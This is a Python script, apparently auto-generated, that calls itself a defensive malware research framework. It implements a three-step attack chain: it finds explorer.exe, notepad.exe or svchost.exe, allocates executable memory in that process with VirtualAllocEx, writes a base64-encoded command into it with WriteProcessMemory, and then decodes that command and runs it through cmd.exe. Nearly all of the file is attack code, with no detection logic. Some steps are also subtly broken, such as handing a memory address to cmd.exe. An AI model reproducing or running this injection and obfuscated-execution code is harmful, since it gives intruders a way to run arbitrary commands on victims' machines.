#!/usr/bin/env python3
"""Merged Modules for Defensive Malware Research Framework"""

import sys
import json
import time
import base64
import ctypes
import psutil
import subprocess
from typing import Dict, Any

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    """Allocate Memory in Target Process using VirtualAllocEx"""
    start = time.time()
    input_data = input_data or {}
    PROCESS_ALL_ACCESS = 0x1F0FFF
    MEM_COMMIT = 0x1000
    PAGE_READWRITE = 0x04
    allocation_size = 1024  # Allocate 1KB of memory

    try:
        # Step 1: Find target process
        target_process = None
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() in ['explorer.exe', 'notepad.exe', 'svchost.exe']:
                target_process = proc
                break

        if target_process is None:
            # Fallback to self-injection
            target_process = psutil.Process()
            injection_success = False
        else:
            injection_success = True

        # Step 2: Allocate memory in the target process
        kernel32 = ctypes.windll.kernel32
        process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_process.pid)
        if not process_handle:
            raise Exception("Failed to open process")

        allocated_address = kernel32.VirtualAllocEx(process_handle, 0, allocation_size, MEM_COMMIT, PAGE_READWRITE)
        if not allocated_address:
            raise Exception("Failed to allocate memory")

        # Step 3: Execute a command using cmd.exe
        cmd_command = f'cmd.exe /c echo Memory allocated at {allocated_address} in process {target_process.pid}'
        subprocess.run(cmd_command, shell=True, timeout=10)

        result = {
            'process_handle': process_handle,
            'allocated_address': allocated_address
        }
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

    except Exception as e:
        result = {
            'process_handle': 0,
            'allocated_address': 0
        }
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    """Write Base64-Encoded Command to Memory"""
    start = time.time()
    input_data = input_data or {}
    try:
        # Constants
        PROCESS_ALL_ACCESS = 0x1F0FFF
        MEM_COMMIT = 0x1000
        PAGE_EXECUTE_READWRITE = 0x40

        # Decode the base64-encoded command
        encoded_command = input_data.get('encoded_command', '')
        command_bytes = base64.b64decode(encoded_command)

        # Find target process
        target_pid = None
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] in ['explorer.exe', 'notepad.exe', 'svchost.exe']:
                target_pid = proc.info['pid']
                break

        if target_pid is None:
            # Fallback to self-injection
            target_handle = ctypes.windll.kernel32.GetCurrentProcess()
            injection_success = False
        else:
            # Open the target process
            target_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
            injection_success = True

        if not target_handle:
            return {'success': False, 'data': {'write_success': False},
                    'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

        # Allocate memory in the target process
        allocated_address = ctypes.windll.kernel32.VirtualAllocEx(target_handle, 0, len(command_bytes),
                                                                  MEM_COMMIT, PAGE_EXECUTE_READWRITE)
        if not allocated_address:
            return {'success': False, 'data': {'write_success': False},
                    'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

        # Write the command to the allocated memory
        bytes_written = ctypes.c_size_t(0)
        write_success = ctypes.windll.kernel32.WriteProcessMemory(target_handle, allocated_address,
                                                                  command_bytes, len(command_bytes),
                                                                  ctypes.byref(bytes_written))
        if not write_success:
            return {'success': False, 'data': {'write_success': False},
                    'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

        # Execute the command using cmd.exe
        subprocess.run(['cmd.exe', '/c', 'start', 'cmd.exe', '/c', f'{allocated_address}'], timeout=10)

        return {'success': True, 'data': {'write_success': True},
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    """Decode and Execute Command using CreateRemoteThread and subprocess.Popen"""
    start = time.time()
    input_data = input_data or {}
    try:
        # Check if the memory write was successful
        write_success = input_data.get('write_success', False)
        
        if not write_success:
            # If write was not successful, return partial failure
            result = {'execution_success': False, 'exit_code': -1}
        else:
            # Decode the base64 encoded command
            encoded_command = input_data.get('encoded_command', '')
            command_bytes = base64.b64decode(encoded_command)
            command = command_bytes.decode('utf-8')

            # Execute the command using subprocess.Popen
            process = subprocess.Popen(['cmd.exe', '/c', command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()

            # Determine execution success based on return code
            execution_success = (process.returncode == 0)
            result = {
                'execution_success': execution_success,
                'exit_code': process.returncode
            }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Allocate Memory in Target Process [execution] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Allocate Memory in Target Process): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Allocate Memory in Target Process): FAILED — {err}')
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T2: Write Base64-Encoded Command to Memory [execution] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Write Base64-Encoded Command to Memory): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Write Base64-Encoded Command to Memory): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Decode and Execute Command [execution] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Decode and Execute Command): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Decode and Execute Command): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result, ensure_ascii=False))